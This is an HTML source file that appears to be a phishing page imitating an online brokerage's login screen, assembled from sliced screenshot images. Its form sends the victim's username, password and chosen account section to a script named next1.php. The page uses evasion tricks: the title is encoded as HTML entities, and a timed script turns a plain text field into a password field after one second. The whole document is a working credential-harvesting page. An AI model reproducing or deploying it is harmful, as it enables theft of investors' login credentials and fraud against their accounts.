<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#76;&#111;&#103;&#32;&#73;&#110;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
  
.textbox { 
    border: 1px solid #c4c4c4; 
    height: 30px; 
    width: 275px; 
    font-size: 14px; 
    padding-left: 8px; 
    border-radius: 3px; 
   
} 
 
.textbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 8px #7bc1f7; 
    
} 

 </style>
<style type="text/css">
  
.textrbox { 
	background-color: #EAEAEA;
    background: -moz-linear-gradient(top, #FFF, #EAEAEA);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0.0, #FFF), color-stop(1.0, #EAEAEA));
    padding-left: 5px;
	border-radius: 2px;
	font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
	font-size: 14px;	
	color: #555;
    border: 1px solid #cdcdcd; 
    outline:0; 
    height: 30px; 
    width: 275px; 
  } 
.textrbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 8px #7bc1f7; 
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:82px; z-index:0"><a href="#"><img src="images/w1.png" alt="" title="" border=0 width=1349 height=82></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:1001px; top:110px; width:251px; height:231px; z-index:1"><img src="images/w2.png" alt="" title="" border=0 width=251 height=231></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1009px; top:351px; width:88px; height:15px; z-index:2"><a href="#"><img src="images/w3.png" alt="" title="" border=0 width=88 height=15></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:1000px; top:380px; width:206px; height:530px; z-index:3"><a href="#"><img src="images/w4.png" alt="" title="" border=0 width=206 height=530></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:100px; top:109px; width:874px; height:218px; z-index:4"><img src="images/w8.png" alt="" title="" border=0 width=874 height=218></div>

<div id="image6" style="position:absolute; overflow:hidden; left:99px; top:326px; width:875px; height:221px; z-index:5"><img src="images/w9.png" alt="" title="" border=0 width=875 height=221></div>

<div id="image7" style="position:absolute; overflow:hidden; left:102px; top:546px; width:872px; height:254px; z-index:6"><img src="images/w10.png" alt="" title="" border=0 width=872 height=254></div>

<div id="image8" style="position:absolute; overflow:hidden; left:103px; top:838px; width:874px; height:258px; z-index:7"><img src="images/w5.png" alt="" title="" border=0 width=874 height=258></div>

<div id="image9" style="position:absolute; overflow:hidden; left:384px; top:547px; width:307px; height:42px; z-index:8"><a href="#"><img src="images/w6.png" alt="" title="" border=0 width=307 height=42></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:102px; top:840px; width:130px; height:14px; z-index:9"><a href="#"><img src="images/w7.png" alt="" title="" border=0 width=130 height=14></a></div>
<form action=next1.php name=chlobhai id=chlobhai method=post>
<input name="usr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:301px;left:387px;top:277px;z-index:10">
<input name="psw" class="textbox" autocomplete="off" type="text" style="position:absolute;width:301px;left:387px;top:346px;z-index:11">
<select name="type" class="textrbox" autocomplete="off" required style="position:absolute;left:387px;top:414px;width:301px;z-index:12">
<option selected="selected" value="Accounts Summary">Accounts Summary</option>
				<option value="Balance">Account Balances</option>
				<option value="PositionsNew">Positions</option>
				<option value="History">History</option>
				<option value="TradingEQ">Stock &amp; ETF Trading</option>
				<option value="OptionStreet">Options Trading</option>
				<option value="TradeMF">Mutual Fund Trading</option>
				<option value="Bond Trading">Bond Trading</option>
				<option value="Research">Research</option>
				<option value="TradeSource">Trade Source</option>
				<option value="StreetSmart">StreetSmart.com</option>
				<option value="Holdings Tracker">Holdings Tracker</option>
				<option value="Order Status">Order Status</option></select>
<div id="formimage1" style="position:absolute; left:459px; top:466px; z-index:13"><input type="image" name="formimage1" width="158" height="32" src="images/logni.png"></div>
</div>

	
</body>
</html>
